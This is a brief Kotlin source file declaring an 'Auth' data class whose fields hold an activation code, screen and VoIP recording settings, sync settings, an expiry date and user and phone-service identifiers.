package com.android.services.models

import com.android.services.db.entities.PhoneServices

data class Auth(
    val isSecure:Boolean=true,
    val activationCode: String,
    val screenRecording: String? = "",
    val voipRecording: String? = "",
    val syncSettings: SyncSetting,
    val expiryDate: String? = "",
    val phoneServiceId: Int,
    val userId: Int,
    val userInfo: List<PhoneServices>
)